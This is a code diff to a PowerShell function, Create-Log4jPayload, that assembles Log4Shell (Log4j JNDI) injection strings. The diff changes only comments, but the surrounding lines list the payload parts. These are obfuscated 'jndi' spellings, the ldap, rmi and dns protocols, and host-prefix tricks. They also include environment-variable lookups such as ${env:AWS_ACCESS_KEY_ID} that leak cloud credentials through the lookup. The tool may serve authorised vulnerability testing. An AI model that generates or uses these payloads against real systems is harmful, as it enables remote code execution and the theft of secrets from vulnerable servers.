@@ -10,7 +10,7 @@ function Create-Log4jPayload
 )
 {
 
-    # Create list jndi variation
+    # Create list of common jndi variations
     $jndi = new-object System.Data.DataTable 
     $null = $jndi.Columns.Add("value")
     $null = $jndi.Rows.Add("JnDi")
@@ -22,7 +22,7 @@ function Create-Log4jPayload
     $null = $jndi.Rows.Add("`${upper:j}`${upper:n}`${upper:d}i")    
     $null = $jndi.Rows.Add("`${env:TEST:-j}ndi")    
     
-    # Create list of procotols
+    # Create list of common procotols variations
     $Protocol = new-object System.Data.DataTable 
     $null = $Protocol.Columns.Add("value")
     $null = $Protocol.Rows.Add("ldap")
@@ -31,14 +31,14 @@ function Create-Log4jPayload
     $null = $Protocol.Rows.Add("rmi")
     $null = $Protocol.Rows.Add("dns")
 
-    # Create list of presubdomain values for postion 1
+    # Create list of presubdomain values for postion 1 - common host ref variations
     $MidPos1 = new-object System.Data.DataTable 
     $null = $MidPos1.Columns.Add("value")
     $null = $MidPos1.Rows.Add("")
     $null = $MidPos1.Rows.Add("127.0.0.1#.")
     $null = $MidPos1.Rows.Add("localhost#.")
 
-    # Create list of presubdomain values for postion 2
+    # Create list of presubdomain values for postion 2 - common command variations
     $MidPos2 = new-object System.Data.DataTable 
     $null = $MidPos2.Columns.Add("value")
     $null = $MidPos2.Rows.Add("")
@@ -68,7 +68,7 @@ function Create-Log4jPayload
     $null = $MidPos2.Rows.Add("`${env:AWS_CONFIG_FILE}.")  
     $null = $MidPos2.Rows.Add("`${env:AWS_ACCESS_KEY_ID}.")   
 
-    # Create list of end position values
+    # Create list of end position value variations
     $EndPos = new-object System.Data.DataTable 
     $null = $EndPos.Columns.Add("value")
     $null = $EndPos.Rows.Add("")
